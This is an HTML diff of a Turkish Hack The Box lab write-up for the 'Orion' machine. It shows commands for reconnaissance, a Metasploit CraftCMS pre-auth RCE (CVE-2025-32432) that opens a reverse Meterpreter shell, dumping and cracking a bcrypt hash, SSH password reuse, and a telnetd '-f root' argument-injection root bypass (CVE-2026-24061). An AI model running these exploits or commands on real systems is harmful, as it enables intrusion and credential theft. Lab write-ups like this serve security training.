@@ -1,0 +1,516 @@
+<title>Orion — HTB Lab Raporu</title>
+<style>
+  :root{
+    --bg:#F2F3F6;
+    --surface:#FFFFFF;
+    --surface-2:#E8EAF0;
+    --ink:#12151C;
+    --ink-soft:#545B6B;
+    --line:#D7DAE2;
+    --accent:#A87C1E;
+    --accent-ink:#FFFFFF;
+    --term-bg:#0D1117;
+    --term-ink:#C9D1D9;
+    --term-dim:#7D8590;
+    --good:#2E7D4F;
+    --crit:#B54747;
+    --shadow: 0 1px 2px rgba(18,21,28,0.04), 0 8px 24px -12px rgba(18,21,28,0.12);
+  }
+  @media (prefers-color-scheme: dark){
+    :root{
+      --bg:#0B0E14;
+      --surface:#12151D;
+      --surface-2:#171B26;
+      --ink:#E7E9EF;
+      --ink-soft:#9AA3B5;
+      --line:#232838;
+      --accent:#D9B453;
+      --accent-ink:#14151A;
+      --term-bg:#08090D;
+      --term-ink:#C9D1D9;
+      --term-dim:#6B7280;
+      --good:#4CAF7D;
+      --crit:#E07272;
+      --shadow: 0 1px 2px rgba(0,0,0,0.3), 0 12px 32px -16px rgba(0,0,0,0.6);
+    }
+  }
+  :root[data-theme="dark"]{
+    --bg:#0B0E14; --surface:#12151D; --surface-2:#171B26; --ink:#E7E9EF; --ink-soft:#9AA3B5;
+    --line:#232838; --accent:#D9B453; --accent-ink:#14151A; --term-bg:#08090D; --term-ink:#C9D1D9;
+    --term-dim:#6B7280; --good:#4CAF7D; --crit:#E07272;
+    --shadow: 0 1px 2px rgba(0,0,0,0.3), 0 12px 32px -16px rgba(0,0,0,0.6);
+  }
+  :root[data-theme="light"]{
+    --bg:#F2F3F6; --surface:#FFFFFF; --surface-2:#E8EAF0; --ink:#12151C; --ink-soft:#545B6B;
+    --line:#D7DAE2; --accent:#A87C1E; --accent-ink:#FFFFFF; --term-bg:#0D1117; --term-ink:#C9D1D9;
+    --term-dim:#7D8590; --good:#2E7D4F; --crit:#B54747;
+    --shadow: 0 1px 2px rgba(18,21,28,0.04), 0 8px 24px -12px rgba(18,21,28,0.12);
+  }
+
+  *{box-sizing:border-box;}
+  body{
+    margin:0;
+    background:var(--bg);
+    color:var(--ink);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    line-height:1.65;
+    -webkit-font-smoothing:antialiased;
+  }
+  .page{
+    max-width:760px;
+    margin:0 auto;
+    padding:0 24px 96px;
+  }
+  a{color:var(--accent);}
+  a:focus-visible, button:focus-visible{outline:2px solid var(--accent); outline-offset:2px;}
+
+  h1,h2,h3{
+    font-family:"Iowan Old Style","Palatino Linotype",Palatino,Georgia,serif;
+    text-wrap:balance;
+    font-weight:600;
+    color:var(--ink);
+  }
+
+  /* ---- Cover ---- */
+  .cover{
+    padding:64px 0 40px;
+    border-bottom:1px solid var(--line);
+    margin-bottom:40px;
+  }
+  .cover-top{
+    display:flex;
+    align-items:center;
+    gap:20px;
+    margin-bottom:28px;
+  }
+  .orion-icon{
+    width:88px; height:88px;
+    border-radius:50%;
+    background:radial-gradient(circle at 32% 28%, #2B3560, #0B0E1C 72%);
+    box-shadow:var(--shadow);
+    flex:none;
+    display:block;
+  }
+  .orion-icon .ln{stroke:rgba(160,180,255,0.45); stroke-width:1.4;}
+  .orion-icon .st{fill:#ffffff;}
+  .orion-icon .st.glow{opacity:.35;}
+  .cover-eyebrow{
+    font-family:ui-monospace,SFMono-Regular,Consolas,"Liberation Mono",Menlo,monospace;
+    font-size:.72rem;
+    letter-spacing:.14em;
+    text-transform:uppercase;
+    color:var(--accent);
+    margin:0 0 6px;
+  }
+  .cover h1{
+    font-size:2.6rem;
+    margin:0;
+    line-height:1.05;
+  }
+  .cover p.dek{
+    max-width:56ch;
+    color:var(--ink-soft);
+    font-size:1.05rem;
+    margin:18px 0 0;
+  }
+  .meta-grid{
+    display:grid;
+    grid-template-columns:repeat(4,1fr);
+    gap:1px;
+    background:var(--line);
+    border:1px solid var(--line);
+    border-radius:10px;
+    overflow:hidden;
+    margin-top:32px;
+  }
+  .meta-cell{
+    background:var(--surface);
+    padding:14px 16px;
+  }
+  .meta-cell .k{
+    display:block;
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.66rem;
+    letter-spacing:.08em;
+    text-transform:uppercase;
+    color:var(--ink-soft);
+    margin-bottom:5px;
+  }
+  .meta-cell .v{
+    font-size:.92rem;
+    font-weight:600;
+    font-variant-numeric:tabular-nums;
+  }
+  .v.diff{color:var(--good);}
+
+  /* ---- chain ---- */
+  .chain{
+    display:flex;
+    flex-wrap:wrap;
+    align-items:center;
+    gap:6px;
+    margin:36px 0 8px;
+  }
+  .chain .step{
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.72rem;
+    letter-spacing:.03em;
+    background:var(--surface-2);
+    border:1px solid var(--line);
+    color:var(--ink);
+    padding:6px 11px;
+    border-radius:6px;
+    white-space:nowrap;
+  }
+  .chain .arrow{color:var(--ink-soft); font-size:.85rem;}
+
+  /* ---- sections ---- */
+  section{margin:56px 0;}
+  .section-label{
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.72rem;
+    letter-spacing:.14em;
+    text-transform:uppercase;
+    color:var(--accent);
+    margin:0 0 8px;
+  }
+  h2{font-size:1.5rem; margin:0 0 4px;}
+  h3{font-size:1.1rem; margin:28px 0 10px; color:var(--ink);}
+  p{margin:14px 0; max-width:66ch;}
+  ul, ol{margin:14px 0; padding-left:1.3em; max-width:64ch;}
+  li{margin:6px 0;}
+  code.inline{
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    background:var(--surface-2);
+    border:1px solid var(--line);
+    padding:.12em .4em;
+    border-radius:4px;
+    font-size:.87em;
+  }
+
+  /* ---- terminal blocks ---- */
+  .term{
+    background:var(--term-bg);
+    border-radius:10px;
+    box-shadow:var(--shadow);
+    overflow:hidden;
+    margin:18px 0;
+  }
+  .term-bar{
+    display:flex;
+    align-items:center;
+    gap:6px;
+    padding:9px 12px;
+    border-bottom:1px solid rgba(255,255,255,0.06);
+  }
+  .term-bar .dot{width:9px; height:9px; border-radius:50%; background:#4b5062;}
+  .term-title{
+    margin-left:8px;
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.7rem;
+    color:var(--term-dim);
+  }
+  .term pre{
+    margin:0;
+    padding:14px 16px 16px;
+    overflow-x:auto;
+    font-family:ui-monospace,SFMono-Regular,Consolas,"Liberation Mono",Menlo,monospace;
+    font-size:.82rem;
+    line-height:1.6;
+    color:var(--term-ink);
+  }
+  .term .p{color:var(--accent);}
+  .term .c{color:#7EC7A2;}
+  .term .o{color:var(--term-dim);}
+  .term .hit{color:#E8B563;}
+
+  /* ---- callouts ---- */
+  .callout{
+    border-left:3px solid var(--accent);
+    background:var(--surface);
+    border-radius:0 8px 8px 0;
+    padding:14px 18px;
+    margin:18px 0;
+    box-shadow:var(--shadow);
+  }
+  .callout .lbl{
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.68rem;
+    letter-spacing:.1em;
+    text-transform:uppercase;
+    color:var(--accent);
+    display:block;
+    margin-bottom:6px;
+  }
+  .callout.crit{border-left-color:var(--crit);}
+  .callout.crit .lbl{color:var(--crit);}
+  .callout.good{border-left-color:var(--good);}
+  .callout.good .lbl{color:var(--good);}
+
+  table.simple{
+    width:100%;
+    border-collapse:collapse;
+    margin:18px 0;
+    font-size:.88rem;
+  }
+  table.simple th, table.simple td{
+    text-align:left;
+    padding:8px 10px;
+    border-bottom:1px solid var(--line);
+    font-variant-numeric:tabular-nums;
+  }
+  table.simple th{
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.68rem;
+    letter-spacing:.06em;
+    text-transform:uppercase;
+    color:var(--ink-soft);
+    font-weight:600;
+  }
+
+  .flag{
+    display:inline-flex;
+    align-items:center;
+    gap:8px;
+    font-family:ui-monospace,SFMono-Regular,Consolas,monospace;
+    font-size:.85rem;
+    background:var(--surface-2);
+    border:1px solid var(--line);
+    padding:8px 12px;
+    border-radius:7px;
+  }
+  .flag .tick{color:var(--good); font-weight:700;}
+
+  footer{
+    margin-top:64px;
+    padding-top:20px;
+    border-top:1px solid var(--line);
+    color:var(--ink-soft);
+    font-size:.82rem;
+  }
+
+  @media (max-width:560px){
+    .meta-grid{grid-template-columns:repeat(2,1fr);}
+    .cover h1{font-size:2rem;}
+  }
+
+  @media print{
+    @page{ margin:14mm; }
+    *{
+      -webkit-print-color-adjust:exact !important;
+      print-color-adjust:exact !important;
+      color-adjust:exact !important;
+    }
+    body{background:#fff;}
+    .page{max-width:none;}
+    .term{box-shadow:none; border:1px solid #333;}
+    .callout{box-shadow:none;}
+    /* only small, atomic blocks are kept whole — large sections are
+       allowed to flow across pages, otherwise a section taller than
+       one page gets shoved entirely onto the next page, leaving a
+       blank gap and clipping content */
+    .term, .callout, .meta-grid, .flag{break-inside:avoid;}
+    h2, h3, .section-label{break-after:avoid;}
+    .cover{break-inside:avoid;}
+  }
+</style>
+
+<div class="page">
+
+  <div class="cover">
+    <div class="cover-top">
+      <svg class="orion-icon" viewBox="0 0 88 88" aria-hidden="true">
+        <g class="ln">
+          <line x1="24.6" y1="14.1" x2="35.2" y2="42.2"/>
+          <line x1="65.1" y1="17.6" x2="52.8" y2="45.8"/>
+          <line x1="35.2" y1="42.2" x2="44" y2="45.8"/>
+          <line x1="44" y1="45.8" x2="52.8" y2="45.8"/>
+          <line x1="35.2" y1="42.2" x2="21.1" y2="72.2"/>
+          <line x1="52.8" y1="45.8" x2="68.6" y2="68.6"/>
+          <line x1="21.1" y1="72.2" x2="68.6" y2="68.6"/>
+        </g>
+        <circle class="st glow" cx="24.6" cy="14.1" r="7"/>
+        <circle class="st glow" cx="65.1" cy="17.6" r="6"/>
+        <circle class="st glow" cx="21.1" cy="72.2" r="7.5"/>
+        <circle class="st glow" cx="68.6" cy="68.6" r="8.5"/>
+        <circle class="st" cx="24.6" cy="14.1" r="2.4"/>
+        <circle class="st" cx="65.1" cy="17.6" r="2"/>
+        <circle class="st" cx="35.2" cy="42.2" r="1.4"/>
+        <circle class="st" cx="44" cy="45.8" r="1.4"/>
+        <circle class="st" cx="52.8" cy="45.8" r="1.4"/>
+        <circle class="st" cx="21.1" cy="72.2" r="2.2"/>
+        <circle class="st" cx="68.6" cy="68.6" r="2.6"/>
+      </svg>
+      <div>
+        <p class="cover-eyebrow">Hack The Box · Very Easy · Linux</p>
+        <h1>Orion</h1>
+      </div>
+    </div>
+    <p class="dek">CraftCMS 5.6.16 üzerinde önceden kimlik doğrulama gerektirmeyen bir nesne enjeksiyonu zinciriyle başlayan, kimlik bilgisi tekrar kullanımı ve savunmasız bir <code class="inline">telnetd</code> ile root'a uzanan bir sızma testi süreci.</p>
+
+    <div class="meta-grid">
+      <div class="meta-cell"><span class="k">Hedef</span><span class="v">orion.htb</span></div>
+      <div class="meta-cell"><span class="k">Zorluk</span><span class="v diff">Very Easy</span></div>
+      <div class="meta-cell"><span class="k">İşletim Sistemi</span><span class="v">Ubuntu 22.04 LTS</span></div>
+      <div class="meta-cell"><span class="k">Kategori</span><span class="v">Web / CraftCMS</span></div>
+    </div>
+
+    <div class="chain">
+      <span class="step">Recon</span><span class="arrow">→</span>
+      <span class="step">CraftCMS RCE (CVE-2025-32432)</span><span class="arrow">→</span>
+      <span class="step">www-data</span><span class="arrow">→</span>
+      <span class="step">.env → MySQL hash</span><span class="arrow">→</span>
+      <span class="step">hashcat</span><span class="arrow">→</span>
+      <span class="step">SSH (adam)</span><span class="arrow">→</span>
+      <span class="step">telnetd bypass (CVE-2026-24061)</span><span class="arrow">→</span>
+      <span class="step">root</span>
+    </div>
+  </div>
+
+  <section>
+    <p class="section-label">01 — Keşif</p>
+    <h2>Port taraması ve web enumerasyonu</h2>
+    <p>Standart bir Nmap taramasıyla başlandı, sadece iki servis açık bulundu: SSH ve HTTP. Web sunucusu <code class="inline">orion.htb</code> host adına yönlendirme yaptığı için host dosyasına ekleme yapıldı.</p>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">nmap -sV -sC 10.129.51.107</span></div>
+      <pre><span class="p">$</span> nmap -sV -sC 10.129.51.107
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+<span class="o">|_http-title: Did not follow redirect to http://orion.htb/</span></pre>
+    </div>
+
+    <p>Ana sayfa yanıt başlıklarında CMS parmak izi doğrudan sızdırılmış:</p>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">curl -I http://orion.htb</span></div>
+      <pre><span class="p">$</span> curl -I http://orion.htb
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+<span class="hit">X-Powered-By: Craft CMS</span></pre>
+    </div>
+
+    <p>Dizin taramasında (<code class="inline">raft-small-directories.txt</code>) idari panel ve statik dosya dizini bulundu:</p>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">gobuster dir</span></div>
+      <pre><span class="p">$</span> gobuster dir -u http://orion.htb -w raft-small-directories.txt -t 100
+assets     <span class="o">(Status: 301)</span> --> /assets/
+admin      <span class="hit">(Status: 302)</span> --> /admin/login
+logout     <span class="o">(Status: 302)</span></pre>
+    </div>
+
+    <div class="callout">
+      <span class="lbl">Not — Yanlış pozitif</span>
+      Aynı taramada, <code class="inline">Host:</code> başlığı fuzzing ile alt alan adı denendiğinde nginx tanımadığı her host için aynı <code class="inline">302 / 154 byte</code> cevabını döndürdü — gerçek bir alt alan adı değil, wildcard davranışı. Boyuta göre filtrelemeden (<code class="inline">-fs</code>) önce bu ayrımı yapmak zaman kaybını önledi.
+    </div>
+
+    <p><code class="inline">/admin/login</code> sayfasının kaynağında geliştirici tarafından gizlenmemiş bir sürüm bilgisi bulundu: <strong>Craft CMS 5.6.16</strong>. Bu sürüm, <strong>CVE-2025-32432</strong>'ye karşı savunmasız — kimlik doğrulama gerektirmeyen bir RCE zinciri.</p>
+  </section>
+
+  <section>
+    <p class="section-label">02 — Foothold</p>
+    <h2>CVE-2025-32432 ile uzaktan kod çalıştırma</h2>
+    <p>Zafiyet, <code class="inline">actions/assets/generate-transform</code> endpoint'inin JSON gövdesini Yii framework'ün nesne yapılandırma sistemi üzerinden işlemesinden kaynaklanıyor; saldırgan tarafından kontrol edilen bir <code class="inline">class</code> anahtarı keyfi sınıf örneklemesine ve dolayısıyla kod çalıştırmaya izin veriyor. Metasploit'in hazır modülü bu zinciri (CSRF token alma → PHP oturum dosyasına web shell enjeksiyonu → reverse shell tetikleme) otomatikleştiriyor.</p>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">msfconsole</span></div>
+      <pre><span class="p">msf</span> > use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
+<span class="p">msf</span> > set rhosts orion.htb
+<span class="p">msf</span> > set rport 80
+<span class="p">msf</span> > set lhost 10.10.17.217
+<span class="p">msf</span> > exploit
+<span class="o">[*] Sending stage (42137 bytes) to 10.129.51.107</span>
+<span class="hit">[*] Meterpreter session 1 opened</span>
+
+<span class="p">meterpreter</span> > getuid
+Server username: <span class="hit">www-data</span></pre>
+    </div>
+
+    <p>TTY yükseltmesi yapılıp dosya sistemi enumere edildi. Craft kurulum dizininde, <code class="inline">.gitignore</code>'a rağmen prodüksiyon <code class="inline">.env</code> dosyası dünya-okunabilir izinlerle duruyordu:</p>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">.env</span></div>
+      <pre>CRAFT_DB_DRIVER=mysql
+CRAFT_DB_SERVER=127.0.0.1
+CRAFT_DB_DATABASE=orion
+CRAFT_DB_USER=root
+<span class="hit">CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!</span></pre>
+    </div>
+  </section>
+
+  <section>
+    <p class="section-label">03 — Kimlik Bilgisi Yeniden Kullanımı</p>
+    <h2>MySQL → bcrypt kırma → SSH</h2>
+    <p>Sızdırılan veritabanı şifresiyle MySQL'e bağlanılıp Craft'ın <code class="inline">users</code> tablosu okundu. Tek admin hesabının (<code class="inline">adam@orion.htb</code>) bcrypt hash'i elde edildi.</p>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">mysql -u root -p orion</span></div>
+      <pre><span class="p">MariaDB [orion]></span> select username, email, password from users;
+admin | adam@orion.htb | <span class="o">$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8N...</span></pre>
+    </div>
+
+    <p>Hash yerel makinede (Kali) hashcat ile <code class="inline">rockyou.txt</code>'a karşı çalıştırıldı — bcrypt maliyeti nedeniyle CPU'da yaklaşık 21 H/s hızla ilerledi, ancak parola sözlüğün başında yer aldığı için 34 saniyede kırıldı:</p>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">hashcat -m 3200</span></div>
+      <pre><span class="p">$</span> hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
+Speed.#01........:       21 H/s
+$2y$13$e9zuohgFZzGtbQalcn9Mz...:<span class="hit">darkangel</span>
+Status...........: Cracked</pre>
+    </div>
+
+    <p>Kırılan parola, CraftCMS admin hesabıyla sınırlı kalmayıp sistem kullanıcısı <code class="inline">adam</code> için de geçerliydi — klasik parola tekrar kullanımı:</p>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">ssh adam@orion.htb</span></div>
+      <pre><span class="p">$</span> ssh adam@orion.htb
+adam@orion.htb's password: <span class="hit">darkangel</span>
+adam@orion:~$ cat user.txt</pre>
+    </div>
+
+    <div class="flag"><span class="tick">✓</span> user.txt ele geçirildi</div>
+  </section>
+
+  <section>
+    <p class="section-label">04 — Yetki Yükseltme</p>
+    <h2>CVE-2026-24061 — telnetd kimlik doğrulama atlatması</h2>
+    <p>Dışa açık olmayan yerel servisler kontrol edildiğinde <code class="inline">127.0.0.1:23</code> üzerinde bir <code class="inline">telnetd</code> bulundu:</p>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">netstat -tulnp</span></div>
+      <pre><span class="p">$</span> netstat -tulnp
+tcp    0  0  127.0.0.1:23    0.0.0.0:*   LISTEN
+tcp    0  0  127.0.0.1:3306  0.0.0.0:*   LISTEN</pre>
+    </div>
+
+    <p><code class="inline">GNU inetutils</code> telnetd'sinde, <code class="inline">USER</code> ortam değişkeninin doğrulanmadan doğrudan <code class="inline">login</code> komutuna argüman olarak geçirilmesinden kaynaklanan bir zafiyet (CVE-2026-24061) mevcut. <code class="inline">-f</code> bayrağı <code class="inline">login</code>'e parola sormadan belirtilen kullanıcıyla oturum açmasını söylüyor; <code class="inline">USER</code> değişkenine bu bayrağı enjekte ederek doğrudan root olarak giriş yapılabiliyor.</p>
+
+    <div class="term">
+      <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="term-title">telnetd auth bypass</span></div>
+      <pre><span class="p">adam@orion:~$</span> USER=<span class="hit">"-f root"</span> telnet -a 127.0.0.1
+Connected to 127.0.0.1.
+Linux orion 5.15.0-171-generic
+<span class="p">root@orion:~#</span> cat root.txt</pre>
+    </div>
+
+    <div class="flag"><span class="tick">✓</span> root.txt ele geçirildi — makine tamamlandı</div>
+  </section>
+
+  <section>
+    <p class="section-label">Özet</p>
+    <h2>Öğrenilen teknikler</h2>
+    <ul>
+      <li>CraftCMS/Yii framework'lerinde JSON tabanlı nesne enjeksiyonu (CVE-2025-32432) ve CSRF token'ı meşru bir GET isteğinden alıp geçerli bir POST isteğinde yeniden kullanma.</li>
+      <li><code class="inline">.env</code> dosyalarının yanlış izinlerle sunucuda kalmasının veritabanı kimlik bilgilerini nasıl ifşa edebileceği.</li>
+      <li>bcrypt hash'lerinin CPU üzerinde hashcat (mod 3200) ile kırılması ve parola tekrar kullanımının web katmanından işletim sistemi katmanına nasıl sıçradığı.</li>
+      <li>Eski/nadir servislerin (<code class="inline">telnetd</code>) sadece localhost'a bağlı olsa dahi saldırı yüzeyi oluşturabileceği — CVE-2026-24061 ortam değişkeni enjeksiyonu.</li>
+    </ul>
+  </section>
+
+  <footer>
+    Kişisel HTB lab notu — orion.htb (10.129.51.107) — Hack The Box, eğitim/lab ortamı. Flag değerleri platform politikası gereği bu belgede paylaşılmamıştır.
+  </footer>
+
+</div>
